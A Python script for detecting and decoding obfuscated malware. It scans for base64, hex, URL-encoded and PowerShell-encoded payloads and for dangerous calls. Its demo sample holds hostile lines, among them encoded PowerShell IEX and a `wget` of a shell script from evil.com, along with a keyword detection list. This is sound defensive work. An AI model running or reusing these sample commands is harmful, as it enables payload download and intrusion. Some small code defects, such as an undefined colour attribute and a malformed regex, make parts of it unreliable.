#!/usr/bin/env python3
#!/usr/bin/env python3
"""20 · MALWARE OBFUSCATION ANALYZER — Detect and decode obfuscated malware"""
import re,base64,argparse,json,os,urllib.parse,binascii,codecs
from colorama import Fore,Style,init
init(autoreset=True)

def analyze_obfuscation(code:str,filename:str="")->dict:
    findings=[]
    decoded_layers=[]

    # Base64 chunks
    b64_matches=re.findall(r'[A-Za-z0-9+/]{20,}={0,2}',code)
    for m in b64_matches[:5]:
        try:
            dec=base64.b64decode(m+"==").decode("utf-8",errors="ignore")
            if any(kw in dec.lower() for kw in ["exec","eval","import","system","cmd","powershell"]):
                findings.append({"type":"BASE64_PAYLOAD","level":"CRÍTICO","encoded":m[:40],"decoded":dec[:100]})
            else:
                decoded_layers.append({"method":"base64","result":dec[:80]})
        except:pass

    # URL encoding
    url_matches=re.findall(r'%[0-9a-fA-F]{2}(?:%[0-9a-fA-F]{2}){4,}',code)
    for m in url_matches[:3]:
        try:
            dec=urllib.parse.unquote(m)
            findings.append({"type":"URL_ENCODED","level":"ALTO","encoded":m[:40],"decoded":dec[:80]})
        except:pass

    # Hex encoding (\x41\x42...)
    hex_matches=re.findall(r'(?:\\x[0-9a-fA-F]{2}){5,}',code)
    for m in hex_matches[:3]:
        try:
            clean=m.replace("\\x","")
            dec=bytes.fromhex(clean).decode("utf-8",errors="ignore")
            findings.append({"type":"HEX_ENCODED","level":"ALTO","encoded":m[:40],"decoded":dec[:80]})
        except:pass

    # PowerShell specific
    ps_enc=re.findall(r'-enc[oded]?\s+([A-Za-z0-9+/=]{10,})',code,re.I)
    for m in ps_enc:
        try:
            dec=base64.b64decode(m).decode("utf-16le",errors="ignore")
            findings.append({"type":"PS_ENCODED_CMD","level":"CRÍTICO","encoded":m[:40],"decoded":dec[:120]})
        except:pass

    # String concatenation obfuscation
    concat_count=len(re.findall(r'["\']\s*\+\s*["\']|chr\(\d+\)',code))
    if concat_count>10:
        findings.append({"type":"STRING_CONCAT_OBFUSCATION","level":"MEDIO",
                          "count":concat_count,"note":"Heavy string concatenation — possible obfuscation"})

    # Eval patterns
    eval_patterns=["eval(","exec(","__import__","os.system","subprocess","shell=True","invoke-expression","-enc"]
    for pat in eval_patterns:
        if pat.lower() in code.lower():
            findings.append({"type":"DANGEROUS_FUNCTION","level":"ALTO","pattern":pat})

    # Entropy
    if len(code)>100:
        freq={};total=len(code)
        for c in code:freq[c]=freq.get(c,0)+1
        import math
        ent=-sum((f/total)*math.log2(f/total) for f in freq.values())
        if ent>5.5:
            findings.append({"type":"HIGH_ENTROPY","level":"MEDIO","entropy":round(ent,2),
                              "note":"Alta entropía — posible código cifrado/comprimido"})

    return{"file":filename,"total_findings":len(findings),"findings":findings,"decoded_samples":decoded_layers[:3]}

def main():
    print(f"{Fore.RED}╔══════════════════════════════════════╗\n║  🎭 MALWARE OBFUSCATION  v1.0        ║\n║  Detect · Decode · Analyze layers   ║\n╚══════════════════════════════════════╝{Style.RESET_ALL}")
    parser=argparse.ArgumentParser(description="Malware Obfuscation Analyzer")
    parser.add_argument("-f","--file",help="Archivo a analizar")
    parser.add_argument("--demo",action="store_true")
    parser.add_argument("-o","--output",default=None)
    args=parser.parse_args()
    if args.demo:
        demo_code='''
$encoded = "JABzAHMAaQBtAGUAbgB0AC4AbgBuAGUAdwAtAGwAZQBuAGEAcwBrAGUAbgAuAEwAbwBnAGcA"
$cmd = [Convert]::FromBase64String($encoded)
IEX -enc JABjAGwAaQBlAG4AdA==
$x = "c"+"m"+"d"+" "+"/c"
eval(base64.b64decode("aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ3dob2FtaScp"))
\x70\x6f\x77\x65\x72\x73\x68\x65\x6c\x6c
os.system("wget http://evil.com/malware.sh")
'''
        print(f"{Fore.YELLOW}[!] Demo mode\n")
        r=analyze_obfuscation(demo_code,"demo_malware.ps1")
    elif args.file:
        if not os.path.isfile(args.file):
            print(f"{Fore.RED}[✗] Archivo no encontrado");return
        with open(args.file,"r",errors="ignore") as f:code=f.read()
        r=analyze_obfuscation(code,args.file)
    else:
        print("  Uso: python3 20_obfuscation_analyzer.py -f malware.ps1")
        print("       python3 20_obfuscation_analyzer.py --demo")
        return
    print(f"\n  {Fore.CYAN}Archivo: {r['file']}")
    print(f"  Hallazgos: {r['total_findings']}\n")
    for f2 in r["findings"]:
        c=Fore.RED if f2["level"]=="CRÍTICO" else Fore.YELLOW if f2["level"]=="ALTO" else Fore.MAGENTA
        print(f"  {c}[{f2['level']}]{Style.RESET_ALL} {f2['type']}")
        if f2.get("decoded"):print(f"    Decoded: {Fore.GREEN}{f2['decoded'][:80]}{Style.RESET_ALL}")
        if f2.get("note"):print(f"    Note   : {Fore.GRAY}{f2['note']}{Style.RESET_ALL}")
    if args.output:
        with open(args.output,"w") as f3:json.dump(r,f3,indent=2)
        print(f"\n{Fore.CYAN}[*] Guardado: {args.output}")
if __name__=="__main__":main()
